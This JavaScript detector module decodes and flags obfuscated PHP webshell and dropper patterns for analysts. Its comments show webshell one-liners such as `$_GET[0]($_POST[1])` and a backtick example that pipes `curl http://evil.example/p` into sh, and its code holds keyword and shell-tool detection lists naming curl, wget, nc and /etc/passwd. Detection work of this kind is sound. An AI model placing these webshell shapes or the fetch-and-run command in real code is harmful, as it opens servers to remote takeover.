// ════════════════════════════════════════════════════════════════════════════
// php-obfuscation.js — PHP webshell / dropper detection &
// deobfuscation. Mirrors the candidate-emission contract of
// cmd-obfuscation.js so each candidate flows through the shared
// `_processCommandObfuscation` post-processor.
//
// Six finder branches:
//   PHP1  Webshell decoder onion — eval(gzinflate(base64_decode("…")))
//         and eval(str_rot13(gzinflate(base64_decode("…")))) +
//         gzuncompress / gzdecode / convert_uudecode variants.
//         The classic PHP web-shell carrier (b374k / WSO / r57 family).
//   PHP2  Variable-variables — $a='sys'.'tem'; $$a('id'); / ${'_GET'}.
//         Indirect function-name lookup via concatenated string vars.
//   PHP3  chr() / pack() reassembly —
//           chr(101).chr(118).chr(97).chr(108)         (eval)
//           pack('H*', '6576616c')                     (eval)
//           pack('c4', 101, 118, 97, 108)
//         Char-by-char reassembly of dangerous function names.
//   PHP4  preg_replace('/.../e', '<code>', $subj) — the deprecated
//         /e modifier RCE primitive (PHP < 7.0; still seen in legacy
//         shells dropped onto outdated targets).
//   PHP5  Superglobal eval — ${$_GET['x']}(…), $_REQUEST['cmd'](…),
//         $_POST['c']($_POST['p']) — the canonical "single-line shell"
//         shape (WSO-style `<?php $_GET[0]($_POST[1]);`).
//   PHP6  data: include — include('data://text/plain;base64,…') and
//         file_get_contents('data:text/html;base64,…') carriers.
//
// Mounted via `Object.assign(EncodedContentDetector.prototype, …)`.
// `scripts/build.py` _DETECTOR_FILES loads this AFTER cmd-obfuscation.js
// (it consumes _processCommandObfuscation at scan time, not at load
// time, so this file has no hard dependency on bash/python decoders).
// ════════════════════════════════════════════════════════════════════════════

// Sensitive-token regex used as the post-decode plausibility gate for
// the PHP1/PHP3 branches. Mirrors SENSITIVE_PY_KEYWORDS structure.
const SENSITIVE_PHP_KEYWORDS = /\b(?:eval|assert|create_function|preg_replace|system|shell_exec|passthru|exec|popen|proc_open|pcntl_exec|backticks|file_get_contents|file_put_contents|fopen|fwrite|include|include_once|require|require_once|fsockopen|stream_socket_client|curl_exec|curl_init|base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|convert_uudecode|hex2bin|chr|ord|ereg_replace|\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_SERVER|\$_FILES|\$GLOBALS|php:\/\/input|php:\/\/filter|data:\/\/|expect:\/\/|allow_url_include|disable_functions|ini_set|extract|parse_str|move_uploaded_file)\b/i;

// PHP "dangerous function names" — the universe of identifiers the
// PHP3 chr/pack reassembly must resolve to in order to emit a candidate.
// Same population the WordPress-malware-scanner / PHP-Malware-Finder
// projects use as their seed list.
const PHP_DANGEROUS_FNS = new Set([
  'eval', 'assert', 'create_function', 'preg_replace',
  'system', 'shell_exec', 'passthru', 'exec', 'popen', 'proc_open',
  'pcntl_exec', 'pcntl_fork',
  'include', 'require', 'include_once', 'require_once',
  'file_get_contents', 'file_put_contents', 'fopen', 'fwrite', 'fputs',
  'curl_exec', 'fsockopen', 'stream_socket_client',
  'base64_decode', 'gzinflate', 'gzuncompress', 'gzdecode',
  'str_rot13', 'convert_uudecode', 'hex2bin',
  'extract', 'parse_str', 'move_uploaded_file',
]);

// Helper: dequote a PHP single- or double-quoted string literal.
// Single-quoted strings only honour `\\` and `\'` escapes; double-quoted
// strings additionally honour `\n \r \t \v \e \f \\ \" \$ \xNN \NNN
// \uHHHH (PHP 7.0+)`. We model both. Returns null if the input doesn't
// look like a single literal.
function _dequotePhpLiteral(s) {
  if (typeof s !== 'string' || s.length < 2) return null;
  if (s[0] === "'" && s[s.length - 1] === "'") {
    return s.slice(1, -1).replace(/\\(['\\])/g, '$1');
  }
  if (s[0] === '"' && s[s.length - 1] === '"') {
    let body = s.slice(1, -1);
    let out = '';
    let i = 0;
    while (i < body.length) {
      const c = body[i];
      if (c !== '\\') { out += c; i++; continue; }
      if (i + 1 >= body.length) { out += '\\'; i++; continue; }
      const n = body[i + 1];
      const simple = { 'n': 10, 'r': 13, 't': 9, 'v': 11, 'e': 27, 'f': 12,
                       '\\': 92, "'": 39, '"': 34, '$': 36 };
      if (simple[n] !== undefined) { out += String.fromCharCode(simple[n]); i += 2; continue; }
      if (n === 'x') {
        const m = /^[0-9a-fA-F]{1,2}/.exec(body.slice(i + 2)); /* safeRegex: builtin */
        if (m) { out += String.fromCharCode(parseInt(m[0], 16)); i += 2 + m[0].length; continue; }
        out += body[i]; i++; continue;
      }
      if (n === 'u' && body[i + 2] === '{') {
        const end = body.indexOf('}', i + 3);
        if (end > 0 && end - i - 3 < 8) {
          try { out += String.fromCodePoint(parseInt(body.slice(i + 3, end), 16)); }
          catch (_) { out += '?'; }
          i = end + 1; continue;
        }
        out += body[i]; i++; continue;
      }
      if (n >= '0' && n <= '7') {
        const m = /^[0-7]{1,3}/.exec(body.slice(i + 1)); /* safeRegex: builtin */
        if (m) { out += String.fromCharCode(parseInt(m[0], 8) & 0xFF); i += 1 + m[0].length; continue; }
        out += body[i]; i++; continue;
      }
      // Unknown escape — PHP preserves the backslash + char verbatim
      out += body[i] + body[i + 1]; i += 2;
    }
    return out;
  }
  return null;
}

// Helper: base64-decode → Uint8Array. Same shape as python-obfuscation.js's
// _b64ToBytes; duplicated to keep the two decoder modules independent.
function _phpB64ToBytes(s) {
  if (typeof s !== 'string') return null;
  const clean = s.replace(/\s+/g, '');
  try {
    if (typeof atob === 'function') {
      const bin = atob(clean);
      const out = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
      return out;
    }
    /* eslint-disable-next-line no-undef */
    return new Uint8Array(Buffer.from(clean, 'base64'));
  } catch (_) { return null; }
}

// Helper: bytes → printable preview. Same shape as python-obfuscation's
// `_bytesToPreview` but inlined (the two modules are independent).
function _phpBytesPreview(bytes) {
  if (!bytes || !bytes.length) return null;
  let s = '';
  try { s = new TextDecoder('utf-8', { fatal: false }).decode(bytes); }
  catch (_) {
    let hex = '';
    for (let i = 0; i < Math.min(bytes.length, 32); i++) {
      hex += bytes[i].toString(16).padStart(2, '0');
    }
    return `<binary ${bytes.length}B: ${hex}\u2026>`;
  }
  let printable = 0;
  for (let i = 0; i < s.length; i++) {
    const c = s.charCodeAt(i);
    if (c === 9 || c === 10 || c === 13 || (c >= 32 && c < 127)) printable++;
  }
  if (s.length > 0 && printable / s.length < 0.7) {
    let hex = '';
    for (let i = 0; i < Math.min(bytes.length, 32); i++) {
      hex += bytes[i].toString(16).padStart(2, '0');
    }
    return `<binary ${bytes.length}B (likely compressed): ${hex}\u2026>`;
  }
  return s;
}

// ── Deobfuscated-amp-ratio clip helper (32× raw / 8 KiB cap) ─────
// Mirrors `_clipDeobfToAmpBudget` in cmd-obfuscation.js (25f2e66,
// bc7d048). PHP1 / PHP3 / PHP6 can legitimately produce very large
// previews: a 256 KiB base64 literal through gzinflate can expand
// 10× to 20×; a 4 KiB pack(H*) hex string expands 2× to plaintext;
// a data:;base64 carrier can embed a full script. Without a cap the
// preview fills the sidebar and trips the fuzz invariant
// `deobf > 32 * raw` (the per-shell obfuscation fuzz target enforces
// this). We clamp to 8 KiB absolute / 32× raw with a `… [truncated]`
// marker reserved inside the budget so clipped output never itself
// trips the invariant.
const _PHP_DEOBF_AMP_RATIO = 32;
const _PHP_DEOBF_ABS_CAP   = 8 * 1024;
const _PHP_DEOBF_TRUNC_MARK = '\u2026 [truncated]';
function _phpClipDeobfToAmpBudget(deobf, raw) {
  if (typeof deobf !== 'string' || deobf.length === 0) return deobf;
  const rawLen = (typeof raw === 'string') ? raw.length : 0;
  const cap = Math.min(_PHP_DEOBF_ABS_CAP, _PHP_DEOBF_AMP_RATIO * Math.max(1, rawLen));
  if (deobf.length <= cap) return deobf;
  const bodyLen = Math.max(0, cap - _PHP_DEOBF_TRUNC_MARK.length);
  if (bodyLen === 0) return deobf.slice(0, cap);
  return deobf.slice(0, bodyLen) + _PHP_DEOBF_TRUNC_MARK;
}

// Apply a chain of PHP decoder names (innermost-first) to a base64-decoded
// byte buffer. Recognised: gzinflate, gzuncompress, gzdecode (gzip),
// str_rot13 (text), convert_uudecode (text), hex2bin (text). Returns
// the final decoded bytes or null on failure.
function _applyPhpDecoderChain(bytes, chain) {
  let cur = bytes;
  for (const name of chain) {
    if (!cur) return null;
    if (name === 'gzinflate') {
      // Raw deflate (RFC 1951)
      if (typeof Decompressor === 'undefined' || typeof Decompressor.inflateSync !== 'function') return null;
      try { cur = Decompressor.inflateSync(cur, 'deflate-raw'); }
      catch (_) { return null; }
    } else if (name === 'gzuncompress') {
      // zlib (RFC 1950) — same as Decompressor.inflateSync('zlib')
      if (typeof Decompressor === 'undefined' || typeof Decompressor.inflateSync !== 'function') return null;
      try { cur = Decompressor.inflateSync(cur, 'zlib'); }
      catch (_) { return null; }
    } else if (name === 'gzdecode') {
      // gzip (RFC 1952)
      if (typeof Decompressor === 'undefined' || typeof Decompressor.inflateSync !== 'function') return null;
      try { cur = Decompressor.inflateSync(cur, 'gzip'); }
      catch (_) { return null; }
    } else if (name === 'str_rot13') {
      // ROT13 — only meaningful on text. Decode bytes as latin-1 first.
      let s = '';
      for (let i = 0; i < cur.length; i++) s += String.fromCharCode(cur[i]);
      const rot = s.replace(/[A-Za-z]/g, ch => {
        const c = ch.charCodeAt(0);
        const base = c < 97 ? 65 : 97;
        return String.fromCharCode(((c - base + 13) % 26) + base);
      });
      cur = new Uint8Array(rot.length);
      for (let i = 0; i < rot.length; i++) cur[i] = rot.charCodeAt(i) & 0xFF;
    } else if (name === 'hex2bin') {
      let s = '';
      for (let i = 0; i < cur.length; i++) s += String.fromCharCode(cur[i]);
      const hex = s.replace(/\s+/g, '');
      if (hex.length % 2 !== 0 || !/^[0-9a-fA-F]+$/.test(hex)) return null;
      cur = new Uint8Array(hex.length / 2);
      for (let i = 0; i < hex.length; i += 2) {
        cur[i / 2] = parseInt(hex.slice(i, i + 2), 16);
      }
    } else if (name === 'convert_uudecode') {
      // uudecode is rare in modern droppers; skip and let the chain
      // bottom out (analyst can decode externally).
      return null;
    } else {
      return null;
    }
  }
  return cur;
}

// ════════════════════════════════════════════════════════════════════════════


Object.assign(EncodedContentDetector.prototype, {

  /**
   * Find PHP obfuscation patterns. Each candidate has the
   * candidate-emission contract:
   *   { type:'cmd-obfuscation', technique, raw, offset, length, deobfuscated }
   * and is consumed by the shared `_processCommandObfuscation`
   * post-processor.
   */
  _findPhpObfuscationCandidates(text, _context) {
    if (!text || text.length < 8) return [];
    const candidates = [];

    // ── PHP1: webshell decoder onion ──
    //
    //   eval(base64_decode('…'))
    //   eval(gzinflate(base64_decode('…')))
    //   eval(str_rot13(gzinflate(base64_decode('…'))))
    //   eval(gzuncompress(base64_decode('…')))
    //   eval(gzdecode(base64_decode('…')))
    //   assert(base64_decode('…'))
    //   create_function('', base64_decode('…'))   (PHP < 7.2)
    //
    // We capture up to 3 nested decoder names + the final base64
    // literal, then apply them innermost-first to recover cleartext.
    // The literal cap (256 KiB) is generous because real WSO/b374k
    // shells run 50-200 KiB.
    const evalChainRe = /\b(?:eval|assert|create_function\s*\(\s*['"]['"]\s*,)\s*\(\s*((?:str_rot13|gzinflate|gzuncompress|gzdecode|hex2bin|convert_uudecode)\s*\(\s*){0,3}base64_decode\s*\(\s*(['"][A-Za-z0-9+/=\s]{8,262144}['"])\s*\)/g;
    let m;
    while ((m = evalChainRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const raw = m[0];
      // Reconstruct the decoder chain from raw text — m[1] only
      // captures the LAST repetition of the optional group, so we
      // re-parse the prefix between `eval(` and `base64_decode(`.
      const prefix = raw.slice(0, raw.indexOf('base64_decode'));
      const chainNames = [];
      const chainRe = /\b(str_rot13|gzinflate|gzuncompress|gzdecode|hex2bin|convert_uudecode)\b/g;
      let cm;
      while ((cm = chainRe.exec(prefix)) !== null) chainNames.push(cm[1]);
      // Apply innermost-first: in PHP source `eval(A(B(C(b64))))`
      // the call order at runtime is C → B → A. Our `chainNames`
      // captures them outermost-first (eval, then A, B, C); reverse
      // to apply innermost-first to the b64-decoded bytes.
      chainNames.reverse();
      const lit = _dequotePhpLiteral(m[2]);
      if (lit === null) continue;
      const b64Bytes = _phpB64ToBytes(lit);
      if (!b64Bytes) continue;
      let final = b64Bytes;
      if (chainNames.length) {
        final = _applyPhpDecoderChain(b64Bytes, chainNames);
        if (!final) {
          // Couldn't unwrap further — surface the b64-decoded preview
          // anyway so the analyst sees something. Common when the
          // chain includes convert_uudecode (which we don't model).
          final = b64Bytes;
        }
      }
      const preview = _phpBytesPreview(final);
      if (!preview || preview.length < 2) continue;
      const clippedPreview = _phpClipDeobfToAmpBudget(preview, raw);
      // Build the pretty technique string in INNER-FIRST call order.
      //
      // `chainNames` is already innermost-first (we reversed on line
      // above). PHP source `eval(A(B(C(base64_decode('…')))))` at
      // runtime applies C → B → A, so the innermost wrapper is the
      // last name in source order — i.e. the first entry in the already-
      // reversed `chainNames`. To emit the label as the reader sees
      // the source (`eval(A(B(C(base64_decode(...)))))`) we reverse
      // BACK to outer-first and concatenate `${name}(` per layer,
      // closing all parens at the tail.
      //
      // Count of closing parens: one per decoder name + one for
      // `base64_decode` + one for the outer `eval` = chainNames.length + 2
      // — but the outer `eval(` contributes its own `)` already; the
      // inner closing chain is `chainNames.length + 1` to close each
      // decoder name and the `base64_decode` call.
      const outerFirst = [...chainNames].reverse();
      const chainPrefix = outerFirst.map(n => `${n}(`).join('');
      const techPretty = chainNames.length
        ? `PHP eval(${chainPrefix}base64_decode(...)${')'.repeat(chainNames.length + 1)}`
        : 'PHP eval(base64_decode(...))';
      candidates.push({
        type: 'cmd-obfuscation',
        technique: techPretty.slice(0, 120),
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: clippedPreview,
        _executeOutput: true,
      });
    }

    // ── PHP2: variable-variables ──
    //
    //   $a = 'sys' . 'tem';
    //   $$a('id');                 →  system('id')
    //   ${'sys' . 'tem'}('id');    →  system('id')   (anon-var form)
    //   $_GET[0]($_GET[1]);        →  GET-based dispatch (PHP5 caller)
    //
    // We build a tiny symbol table from `$VAR = 'a' . 'b' . …;`
    // assignments where the RHS is a string-concat of literals only,
    // then resolve `$$VAR(…)` calls. Sensitivity gate: the resolved
    // name must be in PHP_DANGEROUS_FNS.
    const phpVars = Object.create(null);
    const phpAssignRe = /\$([A-Za-z_]\w{0,63})\s*=\s*((?:['"][^'"\r\n]{0,200}['"](?:\s*\.\s*['"][^'"\r\n]{0,200}['"]){0,12}))\s*;/g;
    let assignBudget = 256;
    while ((m = phpAssignRe.exec(text)) !== null && assignBudget-- > 0) {
      throwIfAborted();
      const name = m[1];
      const rhs = m[2];
      const frags = [...rhs.matchAll(/(['"])((?:[^'"\\\r\n]|\\.){0,200})\1/g)]
        .map(x => _dequotePhpLiteral(x[0]) || '');
      phpVars[name] = frags.join('');
    }

    // $$VAR(...) — variable-variables call. The lookup uses the
    // captured symbol-table entry; if the name resolves into
    // PHP_DANGEROUS_FNS, emit.
    const phpDoubleVarCallRe = /\$\$([A-Za-z_]\w{0,63})\s*\(\s*([^)]{0,400})\)/g;
    while ((m = phpDoubleVarCallRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const name = m[1];
      const fnName = phpVars[name];
      if (!fnName) continue;
      if (!PHP_DANGEROUS_FNS.has(fnName) && !this._bruteforce) continue;
      const args = m[2].trim();
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP Variable-Variables',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: `${fnName}(${args})`,
        _executeOutput: true,
      });
    }

    // ${'a'.'b'.'c'}(...) — anonymous (no symbol-table) form.
    const phpAnonVarRe = /\$\{((?:['"][^'"\r\n]{0,80}['"](?:\s*\.\s*['"][^'"\r\n]{0,80}['"]){1,12}))\}\s*\(\s*([^)]{0,400})\)/g;
    while ((m = phpAnonVarRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const frags = [...m[1].matchAll(/(['"])((?:[^'"\\\r\n]|\\.){0,80})\1/g)]
        .map(x => _dequotePhpLiteral(x[0]) || '');
      const fnName = frags.join('');
      if (!PHP_DANGEROUS_FNS.has(fnName) && !this._bruteforce) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP Variable-Variables (anonymous)',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: `${fnName}(${m[2].trim()})`,
        _executeOutput: true,
      });
    }

    // ── PHP3: chr() / pack() reassembly ──
    //
    //   chr(101).chr(118).chr(97).chr(108)   →  'eval'
    //   pack('H*', '6576616c')               →  'eval'
    //   pack('c4', 101, 118, 97, 108)        →  'eval'
    //
    // We bound the chr-concat count to 64 (longer payloads would not
    // be carried this way; droppers use base64 for that). pack()
    // with H* takes a hex string we already know how to decode.
    const phpChrConcatRe = /chr\s*\(\s*\d{1,4}\s*\)(?:\s*\.\s*chr\s*\(\s*\d{1,4}\s*\)){2,63}/g;
    while ((m = phpChrConcatRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const raw = m[0];
      const nums = [...raw.matchAll(/chr\s*\(\s*(\d{1,4})\s*\)/g)].map(x => parseInt(x[1], 10));
      if (nums.length < 3) continue;
      let s = '';
      for (const n of nums) {
        if (n > 0x10FFFF) { s = ''; break; }
        try { s += String.fromCodePoint(n); } catch (_) { s = ''; break; }
      }
      if (!s || s.length < 3) continue;
      if (!PHP_DANGEROUS_FNS.has(s) && !SENSITIVE_PHP_KEYWORDS.test(s) && !this._bruteforce) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP chr-concat Reassembly',
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: _phpClipDeobfToAmpBudget(s, raw),
        _executeOutput: PHP_DANGEROUS_FNS.has(s),
      });
    }

    // pack('H*', 'HEXSTRING') — reverse-hex unpack. Captures the most
    // common form; pack('c*', N1, N2, …) is rarer and skipped.
    const phpPackHRe = /pack\s*\(\s*['"]H\*['"]\s*,\s*['"]([0-9a-fA-F\s]{4,4096})['"]\s*\)/g;
    while ((m = phpPackHRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const hex = m[1].replace(/\s+/g, '');
      if (hex.length % 2 !== 0) continue;
      let s = '';
      for (let i = 0; i < hex.length; i += 2) {
        s += String.fromCharCode(parseInt(hex.slice(i, i + 2), 16));
      }
      if (s.length < 3) continue;
      if (!PHP_DANGEROUS_FNS.has(s) && !SENSITIVE_PHP_KEYWORDS.test(s) && !this._bruteforce) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP pack(H*) Reassembly',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: _phpClipDeobfToAmpBudget(s, m[0]),
        _executeOutput: PHP_DANGEROUS_FNS.has(s),
      });
    }

    // ── PHP4: preg_replace('/.../e', $code, $subj) ──
    //
    // The /e modifier was the canonical PHP < 7.0 RCE primitive — the
    // replacement string is evaluated as PHP code. Officially deprecated
    // in 5.5 and removed in 7.0, but legacy webshells dropped on EoL
    // hosts still use it. Detection-only (high confidence by structure).
    const phpPregERe = /\bpreg_replace(?:_callback)?\s*\(\s*(['"])(?:[^'"\\\r\n]|\\.){0,400}\1[a-zA-Z]*e[a-zA-Z]*\1?\s*,\s*([^,)]{1,400}),/g;
    // The above is rough — let's use a tighter form that explicitly
    // captures `/PATTERN/[FLAGS_INCLUDING_e]`:
    const phpPregE2Re = /\bpreg_replace(?:_callback)?\s*\(\s*(['"])\/((?:[^'"\\/\r\n]|\\.){0,200})\/([a-zA-Z]{0,12}e[a-zA-Z]{0,12})\1\s*,\s*([^,]{1,400}),\s*([^)]{1,400})\)/g;
    void phpPregERe; // first form kept for future stricter shapes
    while ((m = phpPregE2Re.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const raw = m[0];
      const codeArg = m[4].trim();
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP preg_replace /e modifier',
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: `preg_replace /e \u2192 ${codeArg.slice(0, 200)}`,
        _executeOutput: true,
      });
    }

    // ── PHP5: superglobal eval ──
    //
    //   $_GET['cmd']($_POST['p'])           ← canonical 1-line shell
    //   $_REQUEST[0]($_REQUEST[1])
    //   ${$_GET['x']}('payload')
    //   eval($_REQUEST['c'])
    //   eval($_POST['cmd'])
    //   system($_GET['c'])
    //   shell_exec($_REQUEST[$_COOKIE['k']])
    //
    // The PHP5 branch is detection-only: the dangerous data flow is
    // user-controlled-input → callable. We surface a compact
    // breadcrumb naming the superglobal + the sink, and let the
    // post-processor escalate via _executeOutput.
    const phpSuperglobalCallRe = /\$_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)\s*\[\s*[^\]]{1,80}\]\s*\(\s*[^)]{0,400}\)/g;
    while ((m = phpSuperglobalCallRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const raw = m[0];
      // Skip benign read patterns where the call is `(int)`/`(string)`
      // (false-positive guard; cast-then-call doesn't exist in PHP).
      if (raw.length > 600) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP Superglobal Callable',
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: raw,
        _executeOutput: true,
      });
    }

    const phpEvalSuperglobalRe = /\b(?:eval|assert|system|shell_exec|exec|passthru|popen|proc_open|create_function)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)\s*\[/g;
    while ((m = phpEvalSuperglobalRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const raw = m[0];
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP eval/system on Superglobal',
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: raw,
        _executeOutput: true,
      });
    }

    // ── PHP6: data: URL include / file_get_contents ──
    //
    //   include('data://text/plain;base64,…')
    //   file_get_contents('data:text/plain;base64,…')
    //   file_get_contents('php://input')
    //   include('php://filter/convert.base64-decode/resource=…')
    //
    // The data: scheme is only useful as a code-injection sink when
    // `allow_url_include = On` (which is the case in every documented
    // webshell-loaded environment). We surface the carrier; if it
    // contains base64, decode it for inspection.
    const phpDataIncludeRe = /\b(?:include|include_once|require|require_once|file_get_contents|fopen|readfile)\s*\(\s*['"]((?:data|php|expect|phar|zip|compress\.zlib|compress\.bzip2):\/\/[^'"\r\n]{1,4096})['"]\s*\)/g;
    while ((m = phpDataIncludeRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const url = m[1];
      let preview = url;
      // data:…;base64,… — decode the base64 payload
      const dataB64 = /^data:[^,]*;base64,([A-Za-z0-9+/=]{8,})/.exec(url);
      if (dataB64) {
        const bytes = _phpB64ToBytes(dataB64[1]);
        if (bytes) {
          const decoded = _phpBytesPreview(bytes);
          if (decoded) preview = `data: \u2192 ${decoded}`;
        }
      }
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP data:/php:// stream wrapper include',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: _phpClipDeobfToAmpBudget(preview, m[0]),
        _executeOutput: true,
      });
    }

    // ── PHP7: create_function('', $code) — legacy anonymous-fn RCE ──
    //
    //   $f = create_function('', 'system($_GET[0]);');
    //   $f();
    //
    // PHP < 7.2 accepted a string body as the second arg and eval'd it
    // internally — a direct RCE primitive. Deprecated in 7.2, removed
    // in 8.0, but legacy webshells on EoL hosts still use it. PHP1
    // already matches the `create_function('', base64_decode('…'))`
    // carrier shape; this branch catches the *plaintext* body form
    // (`create_function('', 'system($_GET[\'c\']);')`) that PHP1
    // doesn't see because there's no `base64_decode`/`gzinflate` wrap.
    //
    // We require the body to contain a sensitive PHP keyword — a
    // sanity gate against e.g. `create_function('', 'return $a+$b;')`
    // which is legacy functional-programming style, not obfuscation.
    const phpCreateFnRe = /\bcreate_function\s*\(\s*(['"])[^'"\r\n]{0,200}\1\s*,\s*(['"])((?:[^\\]|\\.){1,2000}?)\2\s*\)/g;
    while ((m = phpCreateFnRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const raw = m[0];
      // Reconstruct a single-literal form so _dequotePhpLiteral can
      // honour the matching quote style.
      const bodyLit = m[2] + m[3] + m[2];
      const body = _dequotePhpLiteral(bodyLit);
      if (!body || body.length < 4) continue;
      if (!SENSITIVE_PHP_KEYWORDS.test(body) && !this._bruteforce) continue;
      const preview = `create_function \u2192 ${body}`;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP create_function Legacy',
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: _phpClipDeobfToAmpBudget(preview, raw),
        _executeOutput: true,
      });
    }

    // ── PHP8: $GLOBALS[...](...) callable-variable indirection ──
    //
    //   $GLOBALS['system']('whoami');                  ← direct
    //   $GLOBALS['_GET'][0]($_POST['p']);              ← user-input dispatch
    //   $GLOBALS['sys'.'tem']('id');                   ← concat (caught by gate)
    //
    // The `$GLOBALS` superglobal provides indirect access to every
    // defined variable and function by name. Malware uses it to
    // launder a callable through a lookup so static string scanners
    // miss the dangerous function name. We accept two dispatch
    // shapes: a key that resolves to a dangerous PHP function name,
    // and a key that names another superglobal (`_GET`/`_POST`/etc,
    // the user-input-dispatch primitive).
    //
    // Distinct from PHP5 (`$_GET[...]()`, `eval($_POST[...])`): PHP5
    // matches bare-superglobal call sites; this branch matches only
    // `$GLOBALS[...]`-keyed lookups, which the PHP5 regexes don't cover.
    const phpGlobalsCallRe = /\$GLOBALS\s*\[\s*(['"])([A-Za-z_]\w{0,63})\1\s*\](?:\s*\[\s*[^\]]{0,80}\])?\s*\(\s*([^)]{0,400})\)/g;
    while ((m = phpGlobalsCallRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const name = m[2];
      const isFn = PHP_DANGEROUS_FNS.has(name);
      const isUserInputVar = /^_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)$/.test(name);
      if (!isFn && !isUserInputVar && !this._bruteforce) continue;
      const args = (m[3] || '').trim();
      const resolved = isFn ? `${name}(${args})` : `$${name}[...](${args})`;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP $GLOBALS Callable',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: _phpClipDeobfToAmpBudget(resolved, m[0]),
        _executeOutput: true,
      });
    }

    // ── PHP9: backtick `…` shell-exec operator ──
    //
    //   $out = `whoami`;
    //   echo `curl http://evil.example/p | sh`;
    //   $u = `uname -a`;
    //
    // PHP's backtick operator is a direct alias for `shell_exec()` —
    // a shell RCE primitive that many webshell scanners miss because
    // it lacks a dangerous function name to grep. We require:
    //
    //   (1) a PHP document context — either `<?php` appears anywhere
    //       earlier in the text, or a PHP sigil (`$var`, `echo`,
    //       `print`, `<?=`, `<?`) appears within 200 chars before the
    //       backtick. This defence rules out false positives in
    //       Markdown, JS template literals (use lowercase backtick
    //       but in different syntactic positions), and shell prompts.
    //
    //   (2) a shell-LOLBin vocabulary hit inside the backticked body.
    //       SENSITIVE_PHP_KEYWORDS is the wrong gate here — it lists
    //       PHP-native identifiers but backticks only run shell, so
    //       we use a tighter shell-executable vocab (curl, wget, nc,
    //       bash, sh, whoami, id, uname, cat /etc/, ps, netcat,
    //       powershell, cmd).
    const SHELL_LOLBIN_RE = /\b(?:whoami|uname|curl|wget|nc|netcat|bash|sh|dash|zsh|powershell|pwsh|cmd|cat|id|ps|ifconfig|ip\s+a|hostname|uname)\b|\/etc\/passwd|\/bin\/|\/usr\/bin\//;
    const hasPhpContext = text.indexOf('<?') !== -1;
    const phpBacktickRe = /(?:^|[\s;{(=])\x60([^\x60\r\n]{2,400})\x60/g;
    while ((m = phpBacktickRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const body = m[1];
      // Locate the backtick itself — m.index points at the preceding
      // delimiter (or 0 if start-of-string).
      const backtickOff = text.indexOf('\x60', m.index);
      if (backtickOff < 0) continue;
      // Document-context gate. Without `<?` we require a local PHP
      // sigil within 200 chars prior.
      let contextOk = hasPhpContext;
      if (!contextOk) {
        const windowStart = Math.max(0, backtickOff - 200);
        const priorWindow = text.slice(windowStart, backtickOff);
        contextOk = /\$[A-Za-z_]\w*\s*=|<\?|\becho\b|\bprint\b/.test(priorWindow);
      }
      if (!contextOk) continue;
      if (!SHELL_LOLBIN_RE.test(body) && !this._bruteforce) continue;
      const preview = `shell_exec \u2192 ${body}`;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'PHP Backtick shell_exec',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: _phpClipDeobfToAmpBudget(preview, m[0]),
        _executeOutput: true,
      });
    }

    return candidates;
  },
});
